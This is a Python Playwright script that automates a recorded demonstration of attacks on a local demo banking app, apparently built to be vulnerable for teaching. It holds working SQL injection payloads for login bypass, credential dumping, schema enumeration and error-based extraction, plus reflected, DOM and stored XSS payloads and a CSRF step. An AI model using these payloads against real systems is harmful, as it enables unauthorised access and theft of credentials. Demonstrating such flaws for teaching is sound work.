# Natural, un-narrated walkthrough of the SecureBank attacks (for screen recording).
# Opens a real Chrome window and performs each attack at a human pace. No captions.
import time, urllib.parse
from playwright.sync_api import sync_playwright

BASE = "http://localhost:3000"
def q(s): return BASE + "/search?q=" + urllib.parse.quote(s)

with sync_playwright() as p:
    br = p.chromium.launch(headless=False, slow_mo=450, args=["--start-maximized"])
    ctx = br.new_context(no_viewport=True)
    page = ctx.new_page()
    page.on("dialog", lambda d: (time.sleep(1.0), d.accept()))

    # Login page - brief pause so you can start recording.
    page.goto(BASE + "/login"); time.sleep(6)

    # 1) SQL injection login bypass
    page.fill("input[name=username]", "admin'-- ")
    page.fill("input[name=password]", "wrongpassword"); time.sleep(1.2)
    page.click("button[type=submit]"); page.wait_for_load_state("networkidle"); time.sleep(3)

    # 2) UNION dump - scroll down so the stolen usernames/passwords are visible
    page.goto(q("' UNION SELECT username,password,1 FROM users-- ")); time.sleep(2)
    page.mouse.wheel(0, 650); time.sleep(4)

    # 3) information_schema enumeration - scroll to show table/column names
    page.goto(q("' UNION SELECT table_name,column_name,1 FROM information_schema.columns WHERE table_schema=database()-- "))
    time.sleep(2); page.mouse.wheel(0, 650); time.sleep(4)

    # 4) error-based injection
    page.goto(q("' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- ")); time.sleep(4)

    # 5) reflected XSS (the red banner is produced by the injected script itself)
    xss = ("<script>document.body.insertAdjacentHTML('afterbegin',"
           "'<div style=\"padding:14px;background:#b00020;color:#fff;font-size:22px;"
           "font-weight:bold\">REFLECTED XSS EXECUTED</div>')</script>")
    page.goto(q(xss)); time.sleep(4)

    # 6) DOM-based XSS (payload in the URL #fragment)
    dom = ("<img src=x onerror=\"document.body.insertAdjacentHTML('afterbegin',"
           "'<div style=&quot;padding:14px;background:#b00020;color:#fff;font-size:22px;"
           "font-weight:bold&quot;>DOM XSS EXECUTED</div>')\">")
    page.goto(BASE + "/dom#" + urllib.parse.quote(dom)); time.sleep(4)

    # 7) CSRF - balance before, attacker page, balance after
    page.goto(BASE + "/dashboard"); time.sleep(3)
    page.goto(BASE + "/attacker/csrf.html"); time.sleep(3)
    page.goto(BASE + "/dashboard"); time.sleep(4)

    # 8) stored XSS - save a script note; it runs on the dashboard
    stored = ("<script>document.body.insertAdjacentHTML('afterbegin',"
              "'<div style=\"padding:14px;background:#b00020;color:#fff;font-size:22px;"
              "font-weight:bold\">STORED XSS EXECUTED</div>')</script>")
    page.fill("textarea[name=body]", stored); time.sleep(1)
    page.click("button[type=submit]"); page.wait_for_load_state("networkidle"); time.sleep(5)

    br.close()
    print("done")
